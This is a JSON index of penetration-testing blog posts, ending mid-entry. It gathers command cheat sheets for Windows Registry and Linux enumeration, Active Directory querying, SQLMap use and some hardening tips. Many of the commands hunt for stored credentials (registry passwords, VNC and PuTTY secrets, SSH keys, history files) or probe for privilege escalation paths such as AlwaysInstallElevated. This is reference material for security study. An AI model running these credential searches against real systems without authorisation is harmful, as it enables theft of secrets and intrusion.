[ { "title": "Windows Registry", "url": "/posts/windows-registry/", "categories": "article", "tags": "registry", "date": "2022-07-13 00:00:00 +0100", "snippet": "RegistryThe Root Keys HKEY_CLASSES_ROOT (HKCR) HKEY_CURRENT_USER (HKCU) HKEY_LOCAL_MACHINE (HKLM) HKEY_USERS (HKU) HKEY_CURRENT_CONFIG (HKCC)Query Registry via Command LineList allreg query &l...", "content": "RegistryThe Root Keys HKEY_CLASSES_ROOT (HKCR) HKEY_CURRENT_USER (HKCU) HKEY_LOCAL_MACHINE (HKLM) HKEY_USERS (HKU) HKEY_CURRENT_CONFIG (HKCC)Query Registry via Command LineList allreg query &lt;hive&gt;Use the /f switch to searchreg query HKLM /f passwordAdd /s to make the search recursive.reg query HKLM /s /f passwordUse /d to only search in the data only.reg query HKLM /d /s /f passwordExamplesInstalled Programsreg query HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall &gt;&gt; installed_programs.txtRecursively loop through all registry keys.reg query HKEY_LOCAL_MACHINE\\Software\\ \\sServicesreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ &gt;&gt; installed_services.txtVNC Storedreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"reg query \"HKCU\\Software\\ORL\\WinVNC4\\Password\"Windows Autologinreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"SNMP Parametersreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"Run-on Bootreg query \"\\\\DC02\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"reg query \"\\\\DC02\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"reg query \"\\\\DC02\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"VNC Passwordreg query \"\\\\DC02\\HKLM\\SOFTWARE\\RealVNC\\WinVNC4 /v password\"Putty Passwordreg query \"\\\\DC02\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"Putty clear text proxy credentials:reg query \"HKCU\\Software\\&lt;user&gt;\\PuTTY\\Sessions\"Check notification packagesreg query \"\\\\DC02\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Notification Packages\"Starting with Windows 2000-based computers, the machine account password automatically changes every 30 days. Check if this has been disabledreg query \"\\\\DC02\\HKLM\\System\\CurrentControlSet\\Services\\Netlogon\\Parameters\" /v \"DisablePasswordChange\"Search for passwords inside the registryreg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /sreg query HKLM /s | findstr /i password &gt; temp.txtreg query HKCU /s | findstr /i password &gt; temp.txtCheck autologonreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"SNMP Settingsreg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"If BOTH registry values are set to 1, we can install a malicious MSI file.reg query \"HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" /v \"AlwaysInstallElevated\"reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\" /v \"AlwaysInstallElevated\"View the Name of the Domain Controllerreg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\" /v DCNameCheck Browser Proxy Settingsreg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Wpad\"Internet Explorer Historyreg query \"HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs\"Check physically attached hardware.reg query \"HKLM\\System\\MountedDevices\"Check recent appsreg query \"HKLM\\Microsoft\\Currentversion\\Search\\RecentApps\"Remotely query the registry for the last logged in user.reg query \"\\\\computername\\HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\WinLogon\"Terminal Server ServiceCheck if enabledreg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\"Enable remote desktop.reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /fDisable remote assistancereg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /fThis setting enforces the deleting of Remote Desktop Services. Command checks if set.reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v \"DeleteTempDirsOnExit\"" }, { "title": "Find Interesting Files", "url": "/posts/find-interesting-files/", "categories": "article", "tags": "enumeration, linux", "date": "2022-06-29 00:00:00 +0100", "snippet": "Finding Interesting FilesFind SUID filesfind / -perm -4000 -type f 2&gt;/dev/nullFind SUID files owned by rootfind / -uid 0 -perm -4000 -type f 2&gt;/dev/nullFind GUID filesfind / -perm -2000 -type...", "content": "Finding Interesting FilesFind SUID filesfind / -perm -4000 -type f 2&gt;/dev/nullFind SUID files owned by rootfind / -uid 0 -perm -4000 -type f 2&gt;/dev/nullFind GUID filesfind / -perm -2000 -type f 2&gt;/dev/nullFind world-writeable filesfind / -perm -2 -type f 2&gt;/dev/nullFind world-writeable files excluding those in /procfind / ! -path \"*/proc/*\" -perm -2 -type f -print 2&gt;/dev/nullFind word-writeable directoriesfind / -perm -2 -type d 2&gt;/dev/nullFind rhost config filesfind /home –name *.rhosts -print 2&gt;/dev/nullFind *.plan files, list permissions and cat the file contentsfind /home -iname *.plan -exec ls -la {} ; -exec cat {} 2&gt;/dev/null ;Find hosts.equiv, list permissions and cat the file contentsfind /etc -iname hosts.equiv -exec ls -la {} 2&gt;/dev/null ; -exec cat {} 2&gt;/dev/null ;See if you can access other user directories to find interesting filesls -ahlR /root/Show the current users’ command historycat ~/.bash_historyShow the current users’ various history filesls -la ~/.*_historyCan we read root’s history filesls -la /root/.*_historyCheck for interesting ssh files in the current users’ directoryls -la ~/.ssh/Find SSH keys/host informationfind / -name \"id_dsa*\" -o -name \"id_rsa*\" -o -name \"known_hosts\" -o -name \"authorized_hosts\" -o -name \"authorized_keys\" 2&gt;/dev/null |xargs -r ls -laCheck Configuration of inetd servicesls -la /usr/sbin/in.*Check log files for keywords (‘pass’ in this example) and show positive matchesgrep -l -i pass /var/log/*.log 2&gt;/dev/nullList files in specified directory (/var/log)find /var/log -type f -exec ls -la {} ; 2&gt;/dev/nullList .log files in specified directory (/var/log)find /var/log -name *.log -type f -exec ls -la {} ; 2&gt;/dev/nullList .conf files in /etc (recursive 1 level)find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} ; 2&gt;/dev/nullAs abovels -la /etc/*.confFind .conf files (recursive 4 levels) and output line number where the word ‘password’ is locatedfind / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2&gt;/dev/nullList open files (output will depend on account privileges)lsof -i -nCan we read roots mailhead /var/mail/root" }, { "title": "Querying Active Directory With PowerShell", "url": "/posts/querying-active-directory-with-powershell/", "categories": "article", "tags": "active-directory, enumeration, powershell", "date": "2022-06-22 00:00:00 +0100", "snippet": "Active Directory Querying With PowerShellPowerShell v1: .NET &amp; ADSIPowerShell v2 &amp; newer: PowerShell Active Directory ModuleImport-module servermanager; add-windowsfeature rsat-ad-toolsImpo...", "content": "Active Directory Querying With PowerShellPowerShell v1: .NET &amp; ADSIPowerShell v2 &amp; newer: PowerShell Active Directory ModuleImport-module servermanager; add-windowsfeature rsat-ad-toolsImport-module servermanager; add-windowsfeature rsat-ad-PowerShell.NETExample of .NET[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllersADSIhttp://www.selfadsi.org/extended-ad/search-domain-controllers.htmExample of ADSI$UserID = \"JoeUser\"$root = [ADSI]''$searcher = new-object System.DirectoryServices.DirectorySearcher($root)$searcher.filter = \"(&amp;(objectClass=user)(sAMAccountName=$UserID))\"$user = $searcher.findall()$userActive Directory ModuleExample of Active Directory Module Requires AD Web Services (ADWS) running on targeted DC (TCP 9389) (Side Note) PowerShell Remoting uses TCP 5985 (HTTP) or TCP 5986 (HTTPS) SOAP XML messages over HTTP translated on DCImport-Module ActiveDirectory$UserID = \"JoeUser\"Get-ADUser $UserID -Property *Here are some of the more useful Active Directory Module commandsGet-Module -ListAvailableGet-Command -Module ActiveDirectoryServer 2008 R2Get/Set-ADForestGet/Set-ADDomainGet/Set-ADDomainControllerGet/Set-ADUserGet/Set-ADComputerGet/Set-ADGroupGet/Set-ADGroupMemberGet/Set-ADObjectGet/Set-ADOrganizationalUnitEnable-ADOptionalFeatureDisable/Enable-ADAccountMove-ADDirectoryServerOperationMasterRoleNew-ADUserNew-ADComputerNew-ADGroupNew-ADObjectNew-ADOrganizationalUnitServer 2012+*-ADResourcePropertyListMember*-ADAuthenticationPolicy*-ADAuthenticationPolicySilo*-ADCentralAccessPolicy*-ADCentralAccessRule*-ADResourceProperty*-ADResourcePropertyList*-ADResourcePropertyValueType*-ADDCCloneConfigFile*-ADReplicationAttributeMetadata*-ADReplicationConnection*-ADReplicationFailure*-ADReplicationPartnerMetadata*-ADReplicationQueueOperation*-ADReplicationSite*-ADReplicationSiteLink*-ADReplicationSiteLinkBridge*-ADReplicationSubnet*-ADReplicationUpToDatenessVectorTableSync-ADObjectA nice looking inventory of DC’sGet-ADDomainController -Filter * | select hostname,IPv4Address,IsGlobalCatalog,IsReadOnly,OperatingSystem | Format-Table -autoActive Directory DriveExample of Active Directory driveImort-Module ActiveDirectorydir ad:Set-Location ad:Set-Location \"dc=lab,dc=pentest,dc=local\"dirANRANR enables you to find a user when you have some information about a user, but don’t know exactly to which attribute that data corresponds. For example, if you know the user has “Thor” somewhere, but don’t know exactly what the SAMAccountName is (or DN, SID, name, etc). Submitting an ANR search will query the AD attributes flagged for ANR (attributes must be indexed) and replies with the results (may be more than one user found).Example of ANRImport-Module ActiveDirectoryGet-ADObject -LDAPFilter {(&amp;(ObjectClass=User)(ANR=Thor))}Active Directory Enumeration with .NETHere are some alternatives to using Get-ADForest &amp; Get-Domain:Get Active Directory Forest Information$ADForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()$ADForestInfo.Name$ADForestInfo.Sites$ADForestInfo.Domains$ADForestInfo.GlobalCatalogs$ADForestInfo.ApplicationPartitions$ADForestInfo.ForestMode$ADForestInfo.RootDomain$ADForestInfo.Schema$ADForestInfo.SchemaRoleOwner$ADForestInfo.NamingRoleOwnerOR[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Name[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Sites[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Domains[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().ApplicationPartitions[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().ForestMode[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().RootDomain[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Schema[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().SchemaRoleOwner[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().NamingRoleOwnerGet Active Directory Domain InformationTarget the current (local) computer’s domain:$ADDomainInfo = [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain()Target the current user’s domain:$ADDomainName = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()$ADDomainInfo.Forest$ADDomainInfo.DomainControllers$ADDomainInfo.Children$ADDomainInfo.DomainMode$ADDomainInfo.Parent$ADDomainInfo.PdcRoleOwner$ADDomainInfo.RidRoleOwner$ADDomainInfo.NameOR[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Forest[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Children[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainMode[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Parent[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().RidRoleOwner[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name Note: Use [System.DirectoryServices.ActiveDirectory.Domain]::GetCOMPUTERDomain().Attribute for the local computer’s domain info.Example:[System.DirectoryServices.ActiveDirectory.Domain]::GetCOMPUTERDomain().ForestGet the local computer’s site information$LocalSiteInfo = [System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite()$LocalSiteInfo.Name$LocalSiteInfo.Domains$LocalSiteInfo.Subnets$LocalSiteInfo.Servers$LocalSiteInfo.AdjacentSites$LocalSiteInfo.SiteLinks$LocalSiteInfo.InterSiteTopologyGenerator$LocalSiteInfo.Options$LocalSiteInfo.Location$LocalSiteInfo.BridgeheadServers$LocalSiteInfo.PreferredSmtpBridgeheadServers$LocalSiteInfo.PreferredRpcBridgeheadServers$LocalSiteInfo.IntraSiteReplicationScheduleOR[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Name[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Domains[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Subnets[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Servers[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().AdjacentSites[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().SiteLinks[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().InterSiteTopologyGenerator[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Options[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().Location[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().BridgeheadServers[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().PreferredSmtpBridgeheadServers[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().PreferredRpcBridgeheadServers[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite().IntraSiteReplicationScheduleSean Metcalf Fave Enumeration CommandsGet a Computer’s Site:[System.DirectoryServices.ActiveDirectory.ActiveDirectorySite]::GetComputerSite()Get a User’s Domain:[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().NameGet a Computer’s Domain:[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().NameList Active Directory FSMOs:([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).SchemaRoleOwner([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).NamingRoleOwner([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).InfrastructureRoleOwner([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).RidRoleOwnerList All Domain Controllers in a Domain:[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllersGet Active Directory Domain Mode:[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainModeGet Trusts for current Active Directory Domain:([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()Get Active Directory Forest Name:[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().NameGet a List of Sites in the Active Directory Forest:[array] $ADSites = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().SitesGet Active Directory Forest Domains:[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().DomainsGet Active Directory Forest Global Catalogues:[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogsGet Active Directory Forest Application Partitions:[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().ApplicationPartitionsGet Active Directory Forest Mode:[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().ForestModeGet Active Directory Forest Root Domain:[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().RootDomainGet Active Directory Forest Schema DN:[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().SchemaPowerShell MitigationsPowerShell version 5 will be out very soon and has several compelling security enhancements.System-wide TranscriptsUse group policy to have PowerShell log all system PowerShell commands and save the transcripts to a share for parsing.Script Block LoggingPowerShell logs the obfuscated code as well as the dynamically generated code that PowerShell actually executes.Constrained PowerShellAutomatically enables PowerShell constrained mode when AppLocker policy is set to “Allow”. This limits PowerShell code execution to only core capability. The offensive PowerShell tools typically used by attackers leverage advanced PowerShell functionality disabled in Constrained Mode.Windows 10 - Antimalware IntegrationWindows 10 adds Antimalware Integration which automatically passes all code PowerShell processes to an installed antimalware solution before execution. If the code is deemed as malicious it doesn’t execute. This also includes code downloaded into memory from the Internet and executed.PowerShell Security Recommendations. Limit PowerShell Remoting (WinRM) - Limit WinRM listener scope to admin subnet &amp; Disable PowerShell Remoting (WinRM) on DCs. Audit/block PowerShell script execution via AppLocker. Once you have PowerShell v3+, Enable PowerShell Module logging (via GPO). This Enables tracking of PowerShell command usage providing capability to detect invoke-mimikatz use - just search PowerShell logs for “mimikatz”. [Note this won’t catch everything] PowerShell v3+: Enable PowerShell Module logging (via GPO). Leverage Metering for PowerShell usage trend analysis - JoeUser ran PowerShell on 10 computers today? Track PowerShell Remoting Usage through NetFlow data OR check the PowerShell logs on clients (event ID 06) &amp; servers (event id 400) Deploy PowerShell v5 and implement system-wide transcripts" }, { "title": "DSQuery", "url": "/posts/dsquery/", "categories": "article", "tags": "dsquery, ldap", "date": "2022-06-20 00:00:00 +0100", "snippet": "DSQueryOpen DS Query GUI Windowrundll32 dsquery,OpenQueryWindowUsersQuery Users From Local server (default 100)dsquery userList Users Remote Server (Unlimited or 2000 results)dsquery user -s 10.100...", "content": "DSQueryOpen DS Query GUI Windowrundll32 dsquery,OpenQueryWindowUsersQuery Users From Local server (default 100)dsquery userList Users Remote Server (Unlimited or 2000 results)dsquery user -s 10.100.1.254 -limit 0dsquery user -s 10.100.1.254 -limit 2000Query a specific userdsquery user -samid &lt;username&gt; -s &lt;DC IP Address&gt;dsquery user -samid Administrator -s 10.100.1.254List AD Users starting with ‘b’, don’t limit the number of results returned and request particular fields.dsquery user -name \"b*\" -s 10.100.1.254 -limit 0 | dsget user -samid -sid -fn -ln -email -dept -disabled -reversiblepwd -mustchpwd -canchpwd -acctexpires -s 10.100.1.254How to Reset Active Directory User’s Password from Command Linedsquery user -samid enter_username_here | dsmod user -pwd enter_new_pw_here -mustchpwd noFind out if a user account is currently enabled or disabled.dsquery user DC=%userdnsdomain:.=,DC=% -name %username% | dsget user -disabled -dnStale user accountsdsquery user domainroot -stalepwd 100 -limit 0Disabled user accountsdsquery user domainroot -disabled -limit 0Remotely Reset the Active Directory User’s password from the command line.psexec domain_controller_ip dsquery user -samid enter_username_here | dsmod user -pwd enter_new_pw_here -mustchpwd no enter_new_pw_hereComputersList all computersdsquery computer -limit 0dsquery computer -s 10.100.1.254dsquery computer -d marvel.labStale computer accountsdsquery computer domainroot -stalepwd 180 -limit 0Loop through Domain Computers and run a commandLoop through all the computers in the domain (Great for Adding Further Queries)for /f %i in ('dsquery computer -o rdn) do echo %iGroupList all groups with Admin in the namedsquery group -name \"*Admin*\" -s 10.100.1.254dsquery group -name \"*Admin*\" -s 10.100.1.254 | dsget group -members -expand -s 10.100.1.254List all members of all group(s)dsquery group -name \"*\" -s 10.100.1.254 | dsget group -members -expand -s 10.100.1.254List all users in security groupdsquery group -name \"\" | dsget group -members -expand | dsget user -fn -ln -disabledServersGet Domain Controllersdsquery server -s 10.100.1.254Global Catalog (-isgc)dsquery server -isgcLoop through Domain servers and run a commandLoop over a list of DC’s using dsquery (Great for Adding Further Queries)for /f %i in ('dsquery server -o rdn') do echo %iDomain Controller IP Configurationfor /f %i in ('dsquery server -domain %userdnsdomain% -o rdn') do psexec //%i ipconfig /allAD Database disk usagefor /f %i in ('dsquery server -domain %userdnsdomain% -o rdn') do dir //%i/admin$/ntdsDomain Controller Netlogon entriesfor /f %i in ('dsquery server -o rdn') do echo %i &amp; reg query //%i/hklm/system/currentcontrolset/services/netlogon/parametersDNS Zones in ADfor /f %i in ('dsquery server -o rdn') do Dsquery * -s %i domainroot -filter (objectCategory=dnsZone)Enumerate DNS Server Zonesfor /f %i in ('dsquery server -domain %userdnsdomain% -o rdn') do dnscmd %i /enumzonesSitesReturn the object if KCC Intra/Inter site is disabled for each sitedsquery site | dsquery * -attr * -filter \"(|(Options:1.2.840.113556.1.4.803:=1)(Options:1.2.840.113556.1.4.803:=16))\"Return the object if KCC Intra/Inter site is disabled for each sitedsquery site | dsquery * -attr * -filter \"(|(Options:1.2.840.113556.1.4.803:=1)(Options:1.2.840.113556.1.4.803:=16))\"SubnetsSubnet informationdsquery subnet -limit 0OUList Organisational Unitsdsquery OUACL on all OUsfor /f \"delims=|\" %i in ('dsquery OU') do acldiag %iCustom QueriesRemember all below queries can have the following added: s 10.100.1.254 will make the command query a remote server. d marvel.lab will make the command query a DC in the domain limit 0 this option will allow ldap to return unlimited results as apposed to the default of 100 records. If 0 is given then the result set will be unlimited.ServersFind servers in the domaindsquery * domainroot -filter \"(&amp;(objectCategory=Computer)(objectClass=Computer)(operatingSystem=*Server*))\"Domain Controllers per sitedsquery * \"CN=Sites,CN=Configuration,DC=MARVEL,DC=LAB\" -filter \"(objectCategory=Server)\"Global Catalog Servers from ADdsquery * \"CN=Configuration,DC=MARVEL,DC=LAB\" -filter \"(&amp;(objectCategory=nTDSDSA)(options:1.2.840.113556.1.4.803:=1))\"DSQuery authorised DHCP Serversdsquery * \"cn=NetServices,cn=Services,cn=Configuration,DC=MARVEL,DC=LAB\" -attr dhcpServersUsersExport all usernames and email addressesdsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(mail=*))\" -attr sAMAccountName name mailUser accounts that are not disableddsquery * -filter \"(&amp;(objectCategory=Person)(objectClass=User)(!userAccountControl:1.2.840.113556.1.4.803:=2))\"User accounts that are disableddsquery * domainroot -filter \"(&amp;(objectCategory=Person)(objectClass=User)(userAccountControl:1.2.840.113556.1.4.803:=2))\"Users with no logon scriptdsquery * domainroot -filter \"(&amp;(objectCategory=Person)(objectClass=User)(!scriptPath=*))\" -attr sAMAccountName sn givenName pwdLastSet distinguishedNameUser accounts with no password requireddsquery * domainroot -filter \"(&amp;(objectCategory=Person)(objectClass=User)(userAccountControl:1.2.840.113556.1.4.803:=32))\"User accounts with no password expirydsquery * domainroot -filter \"(&amp;(objectCategory=Person)(objectClass=User)(userAccountControl:1.2.840.113556.1.4.803:=65536))\"Find user by account name.dsquery * domainroot -filter \"(samAccountName=Black.Widow)\" -attr *Find a user by their email address.dsquery * domainroot -filter \"(&amp;(objectClass=User) (mail=Black.Widow@marvel.lab))\" -attr *Find users with passwords set never to expire.dsquery * domainroot -filter \"(&amp;(objectClass=User) (userAccountControl&gt;=65536))\" -attr samAccountName userPrincipalName userAccountControlGroupsFind users in Domain Admin Group.dsquery * -filter \"&amp;(objectCategory=group)(CN=Domain Admins)\" | dsget group -members | dsget user -dn -samid -sid -fn -ln -display -emailFind empty groups.dsquery * -filter \"&amp;(objectCategory=group)(!member=*)\" -limit 0 -attr whenCreated whenChanged groupType sAMAccountName distinguishedName memberOfGroup PoliciesInformation on existing GPOsdsquery * \"CN=Policies,CN=System,DC=MARVEL,DC=LAB\" -filter \"(objectCategory=groupPolicyContainer)\" -attr displayName cnwhenCreated gPCFileSysPathFind the policy display name given the GUID.dsquery * \"CN=Policies,CN=System,DC=MARVEL,DC=LAB\" -filter \"(objectCategory=groupPolicyContainer)\" -attr Name displayNameUseful InformationForest/Domain Functional Levelsdsquery * \"cn=partitions,cn=configuration,DC=MARVEL,DC=LAB\" -filter \"(|(systemFlags=3)(systemFlags=-2147483648))\" -attr msDS-Behavior-Version Name dnsroot ntmixeddomain NetBIOSNameFind when the AD was installed.dsquery * \"CN=configuration,DC=MARVEL,DC=LAB\" -attr whencreated -scope baseReturn the AD Schemadsquery * \"CN=schema,CN=configuration,DC=MARVEL,DC=LAB\" -scope base -attr whenCreated whenChanged objectVersion 13 Windows 2000 Server operating system 30 Windows Server 2003 operating system 31 Windows Server 2003 R2 operating system 44 Windows Server 2008 operating system (AD DS) 47 Windows Server 2008 R2 operating system (AD DS) 56 Windows Server 2012 operating system (AD DS) 69 Windows Server 2012 R2 operating system (AD DS) 87 Windows Server 2016 operating system (AD DS) 88 Windows Server v1803 operating system (AD DS) TrustsEnumerate the trusts from the specified domaindsquery * \"CN=System,DC=MARVEL,DC=LAB\" -filter \"(objectClass=trustedDomain)\" -attr trustPartner flatNameFind a DC for each trusted domainfor /f \"skip=1\" %i in ('\"dsquery * CN=System,DC=MARVEL,DC=LAB -filter (objectClass=trustedDomain) -attr *\"') do nltest /dsgetdc:%iSites &amp; SubnetsAD Site Informationdsquery * \"CN=Sites,CN=Configuration,DC=MARVEL,DC=LAB\" -attr cn description location -filter \"(objectClass=site)\"Site Links and Costdsquery * \"CN=Sites,CN=Configuration,DC=MARVEL,DC=LAB\" -attr cn costdescription replInterval siteList -filter \"(objectClass=siteLink)\"AD Subnet and Site Informationdsquery * \"CN=Subnets,CN=Sites,CN=Configuration,DC=MARVEL,DC=LAB\" -attr cn siteObject description location" }, { "title": "IIS Version Header Server Lookup", "url": "/posts/iis-version-header-server-lookup/", "categories": "article", "tags": "enumeration, iis", "date": "2022-06-17 00:00:00 +0100", "snippet": " Version Operating system Launch Date End Of Support IIS 4 Windows NT 4 1996 2006 IIS 5 Windows 2000 1999 2010 ...", "content": " Version Operating system Launch Date End Of Support IIS 4 Windows NT 4 1996 2006 IIS 5 Windows 2000 1999 2010 IIS 6 Windows Server 2003 May 28, 2003 Jul 14, 2015 IIS 7 Windows Server 2008 May 6, 2008 Jan 14, 2020 IIS 7.5 Windows Server 2008 R2 Oct 22, 2009 Jan 14, 2020 IIS 8 Windows Server 2012 2012 Oct 10, 2023 IIS 8.5 Windows Server 2012 R2 2013 Oct 10, 2023 IIS 10 Windows Server 2016 2016 Jan 12, 2027 IIS 10 Windows Server 2019 2018 Jan 9, 2029 " }, { "title": "AWS EFS NFS file system Security Checklist", "url": "/posts/aws-efs-nfs-file-system-security-checklist/", "categories": "article", "tags": "aws, cloud", "date": "2022-06-16 00:00:00 +0100", "snippet": "AWS EFS (NFS file system); Quick Security Hardening GuideNo pun intended!This acts as a Quick Checklist for securing your AWS EFS Instances. EFS is Amazon’s implementation of the network file syste...", "content": "AWS EFS (NFS file system); Quick Security Hardening GuideNo pun intended!This acts as a Quick Checklist for securing your AWS EFS Instances. EFS is Amazon’s implementation of the network file system or NFS protocol for Amazon’s cloud customers. In less than four steps!The information provided is my own advise. I hope to provide you with a better understanding about AWS EFS and how you can use it securely. See the external references for supporting material.Let’s get configuring!Checklist1.\tEncryption : enabled by default, however consider checking it is configured securely. Refer to Amazon if in doubt.2.\tNetwork access: make sure that default security groups have been removed; only security groups created by you can access the mounted file system(s). This limits the file system access to only relevant parties. 3.\tConsider using unique SSH keys to access each Instance: an Amazon EFS instance. Compromised keys cannot be reused on multiple machines (i suspect you are using unique and strong SSH keys)4.\tSee other ideas in the external references. References:Edureka!, AWS EFS Tutorial: https://m.youtube.com/watch?v=yKhE2hzlbqAAmazon, on AWS EFS security: https://docs.aws.amazon.com/efs/latest/ug/security-considerations.html" }, { "title": "SQLi Tools", "url": "/posts/sqli-tools/", "categories": "article", "tags": "sql-injection", "date": "2022-06-13 00:00:00 +0100", "snippet": "SQLi ToolsWhen it comes to SQLi tools there are two main offerings. We have SQLmap and we have Sqlninja.SQLMap is an advanced and automatic SQL injection tool. Its main purpose is to scan, detect, ...", "content": "SQLi ToolsWhen it comes to SQLi tools there are two main offerings. We have SQLmap and we have Sqlninja.SQLMap is an advanced and automatic SQL injection tool. Its main purpose is to scan, detect, and exploit the SQL injection flaws for a given URL. It supports various database management systems (DBMS) such as MS-SQL, MySQL, Oracle, and PostgreSQL. It can also identify other database systems, such as DB2, Informix, Sybase, InterBase, and MS-Access. SQLMap employs four unique SQL injection techniques: inferential blind SQL injection, UNION query SQL injection, stacked queries, and time-based blind SQL injection. Its broad features and options include database fingerprinting, enumerating, data extracting, accessing the target filesystem, and executing the arbitrary commands with full operating system access. Additionally, it can parse the list of targets from the Burp proxy or WebScarab logs and the standard text file. SQLMap also allows scanning the Google search engine with classified Google dorks to extract specific targets.SQL Ninja is a specialized tool that is developed to target those web applications that use MS-SQL Server on the backend, and are vulnerable to SQL injection flaws. Its main goal is to exploit these vulnerabilities to take over the remote database server through an interactive command shell, instead of just extracting the data from the database. It includes various options to perform this task, such as server fingerprint, password brute force, privilege escalation, upload remote backdoor, direct shell, backscan connect shell (firewall bypass), reverse shell, DNS tunnelling, single command execution, and Metasploit integration. Thus, it is not a tool that scans and discovers the SQL injection vulnerabilities but one that exploits any such existing vulnerability to gain OS access.Links on SQLi Attacks and Toolshttp://troels.arvin.dk/db/rdbms/ - explain language differences between attackshttp://hakipedia.com/index.php/SQL_Injectionhttp://sqlninja.sourceforge.net/sqlninja-howto.htmlhttps://github.com/sqlmapproject/sqlmap/wiki/UsageSQLMapShow basic help message and exitsqlmap -hShow advanced help message and exitsqlmap -hhCrawl a websitesqlmap -u http://192.168.19.84 --crawl=1Target URLsqlmap -u http://www.site.com/vuln.php?id=1Show 